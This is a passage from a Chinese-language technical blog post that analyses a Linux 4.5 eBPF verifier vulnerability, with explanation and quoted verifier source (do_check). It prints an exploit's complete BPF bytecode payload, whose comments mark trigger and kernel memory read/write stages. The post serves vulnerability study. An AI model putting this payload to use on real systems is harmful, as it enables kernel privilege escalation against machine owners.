imm;        <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>打个比方，比如<code>mov eax,0xffffffff</code>这一汇编语句，如果翻译成bpf的语句，那么就是<code>BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF)</code>，<code>BPF_MOV32_IMM</code>指令的数据结构如下(<code>include/linux/filter.h</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)                 \</span></span><br><span class="line">((struct bpf_insn) &#123;                    \</span><br><span class="line">    .code  = BPF_ALU | BPF_MOV | BPF_K,     \</span><br><span class="line">    .dst_reg = DST,                 \</span><br><span class="line">    .src_reg = <span class="number">0</span>,                   \</span><br><span class="line">    .off   = <span class="number">0</span>,                 \</span><br><span class="line">    .imm   = IMM &#125;)</span><br></pre></td></tr></table></figure><p>根据数据结构，可将指令转化为字节码<code>\xb4\x09\x00\x00\xff\xff\xff\xff</code>(相关宏可查看<code>include/uapi/linux/bpf_common.h</code>以及<code>include/uapi/linux/bpf.h</code>)</p><h1 id="bpf加载流程"><a href="#bpf加载流程" class="headerlink" title="bpf加载流程"></a>bpf加载流程</h1><p>一个典型的BPF程序流程为：</p><ol><li><p>用户程序调用syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))申请创建一个map，在attr结构体中指定map的类型、大小、最大容量等属性。</p></li><li><p>用户程序调用syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))来将我们写的BPF代码加载进内核，attr结构体中包含了指令数量、指令首地址指针、日志级别等属性。在加载之前会利用虚拟执行的方式来做安全性校验，这个校验包括对指定语法的检查、指令数量的检查、指令中的指针和立即数的范围及读写权限检查，禁止将内核中的地址暴露给用户空间，禁止对BPF程序stack之外的内核地址读写。安全校验通过后，程序被成功加载至内核，后续真正执行时，不再重复做检查。</p></li><li><p>用户程序通过调用setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)将我们写的BPF程序绑定到指定的socket上。Progfd为上一步骤的返回值。</p></li><li><p>用户程序通过操作上一步骤中的socket来触发BPF真正执行。</p></li></ol><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>上面很多知识点大多都是网上资料(笑～)，接下来来详细看看漏洞成因，以下代码均为<code>linux-4.5</code>内核代码</p><p>我们先来看看exp中payload的设置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__prog =</span><br><span class="line"><span class="comment">// 漏洞触发阶段payload</span></span><br><span class="line"><span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span> <span class="comment">//BPF_REG_9 = 0xffffffff</span></span><br><span class="line"><span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span> <span class="comment">//if BPF_REG_9 == -1 &#123;  </span></span><br><span class="line"><span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span> <span class="comment">// BPF_REG_0 = 0&#125; </span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span> <span class="comment">// exit(0)</span></span><br><span class="line"><span class="comment">// 申请map</span></span><br><span class="line"><span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">// 漏洞利用阶段payload</span></span><br><span class="line"><span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br></pre></td></tr></table></figure><p>首先，在<code>kernel/bpf/verifier.c</code>中，会对用户请求设置的bpf指令进行验证，实际上就是虚拟执行用户设置的bpf指令，检查其是否存在不合法的操作，如泄露内核栈指针地址，直接的内存读写等，如果存在不合法的操作，那么bpf指令将会被拒绝加载</p><p>payload前四行我标出了bpf指令对应的伪代码，我们一行一行来看，这四行就包含了漏洞触发的关键</p><p>首先整个payload代码将会经过<code>kernel/bpf/verifier.c</code>中的do_check函数，函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_check</span><span class="params">(struct verifier_env *env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> *<span class="title">state</span> =</span> &amp;env-&gt;cur_state;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insns</span> =</span> env-&gt;prog-&gt;insnsi;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> *<span class="title">regs</span> =</span> state-&gt;regs;</span><br><span class="line">    <span class="keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;</span><br><span class="line">    <span class="keyword">int</span> insn_idx, prev_insn_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> insn_processed = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> do_print_state = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    init_reg_state(regs);</span><br><span class="line">    insn_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123; <span class="comment">// 通过循环来检查用户设置的每一行bpf指令</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span>;</span></span><br><span class="line">        u8 <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">        <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;invalid insn idx %d insn_cnt %d\n&quot;</span>,</span><br><span class="line">                insn_idx, insn_cnt);</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        insn = &amp;insns[insn_idx]; <span class="comment">// 获得一行指令</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> =</span> BPF_CLASS(insn-&gt;code); <span class="comment">// 检查此指令所属的class，BPF_CLASS宏为：#define BPF_CLASS(code) ((code) &amp; 0x07)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (++insn_processed &gt; <span class="number">32768</span>) &#123; <span class="comment">// 判断bpf指令数是否过多</span></span><br><span class="line">            verbose(<span class="string">&quot;BPF program is too large. Proccessed %d insn\n&quot;</span>,</span><br><span class="line">                insn_processed);</span><br><span class="line">            <span class="keyword">return</span> -E2BIG;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        err = is_state_visited(env, insn_idx); <span class="comment">// 判断是否存在等价状态</span></span><br><span class="line">        <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        <span class="keyword">if</span> (err == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">/* found equivalent state, can prune the search */</span></span><br><span class="line">            <span class="keyword">if</span> (log_level) &#123;</span><br><span class="line">                <span class="keyword">if</span> (do_print_state)</span><br><span class="line">                    verbose(<span class="string">&quot;\nfrom %d to %d: safe\n&quot;</span>,</span><br><span class="line">                        prev_insn_idx, insn_idx);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    verbose(<span class="string">&quot;%d: safe\n&quot;</span>, insn_idx);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> process_bpf_exit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (log_level &amp;&amp; do_print_state) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;\nfrom %d to %d:&quot;</span>, prev_insn_idx, insn_idx);</span><br><span class="line">            print_verifier_state(env);</span><br><span class="line">            do_print_state = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (log_level) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;%d: &quot;</span>, insn_idx);</span><br><span class="line">            print_bpf_insn(insn);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) &#123; <span class="comment">//判断class类型，此为第一句payload进入的分支</span></span><br><span class="line">            err = check_alu_op(env, insn);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_LDX) &#123;</span><br><span class="line">            <span class="keyword">enum</span> bpf_reg_type src_reg_type;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check for reserved fields is already done */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check src operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            src_reg_type = regs[insn-&gt;src_reg].type;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check that memory (src_reg + off) is readable,</span></span><br><span class="line"><span class="comment">             * the state of dst_reg will be updated by this func</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,</span><br><span class="line">                           BPF_SIZE(insn-&gt;code), BPF_READ,</span><br><span class="line">                           insn-&gt;dst_reg);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;</span><br><span class="line">                insn_idx++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/* saw a valid insn</span></span><br><span class="line"><span class="comment">                 * dst_reg = *(u32 *)(src_reg + off)</span></span><br><span class="line"><span class="comment">                 * use reserved &#x27;imm&#x27; field to mark this insn</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                insn-&gt;imm = src_reg_type;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (src_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">                   (src_reg_type == PTR_TO_CTX ||</span><br><span class="line">                    insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">                <span class="comment">/* ABuser program is trying to use the same insn</span></span><br><span class="line"><span class="comment">                 * dst_reg = *(u32*) (src_reg + off)</span></span><br><span class="line"><span class="comment">                 * with different pointer types:</span></span><br><span class="line"><span class="comment">                 * src_reg == ctx in one branch and</span></span><br><span class="line"><span class="comment">                 * src_reg == stack|map in some other branch.</span></span><br><span class="line"><span class="comment">                 * Reject it.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_STX) &#123;</span><br><span class="line">            <span class="keyword">enum</span> bpf_reg_type dst_reg_type;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;</span><br><span class="line">                err = check_xadd(env, insn);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line">                insn_idx++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check src1 operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line">            <span class="comment">/* check src2 operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            dst_reg_type = regs[insn-&gt;dst_reg].type;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check that memory (dst_reg + off) is writeable */</span></span><br><span class="line">            err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">                           BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                           insn-&gt;src_reg);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">                insn-&gt;imm = dst_reg_type;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dst_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">                   (dst_reg_type == PTR_TO_CTX ||</span><br><span class="line">                    insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_ST) &#123;</span><br><span class="line">            <span class="keyword">if</span> (BPF_MODE(insn-&gt;code) != BPF_MEM ||</span><br><span class="line">                insn-&gt;src_reg != BPF_REG_0) &#123;</span><br><span class="line">                verbose(<span class="string">&quot;BPF_ST uses reserved fields\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* check src operand */</span></span><br><span class="line">            err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check that memory (dst_reg + off) is writeable */</span></span><br><span class="line">            err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">                           BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                           <span class="number">-1</span>);</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_JMP) &#123; <span class="comment">// 第二行payload进入此分支</span></span><br><span class="line">            u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (opcode == BPF_CALL) &#123;</span><br><span class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">                    insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;BPF_CALL uses reserved fields\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                err = check_call(env, insn-&gt;imm);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</span><br><span class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">                    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;BPF_JA uses reserved fields\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                insn_idx += insn-&gt;off + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">                <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">                    insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">                    insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">                    insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment">                 * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment">                 * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment">                 * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment">                 * something into it earlier</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">                    verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> -EACCES;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">process_bpf_exit:</span><br><span class="line">                insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">                <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    do_print_state = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 第二行payload进入此分支</span></span><br><span class="line">                err = check_cond_jmp_op(env, insn, &amp;insn_idx);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    <span class="keyword">return</span> err;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_LD) &#123;</span><br><span class="line">            u8 mode = BPF_MODE(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mode == BPF_ABS || mode == BPF_IND) &#123;</span><br><span class="line">         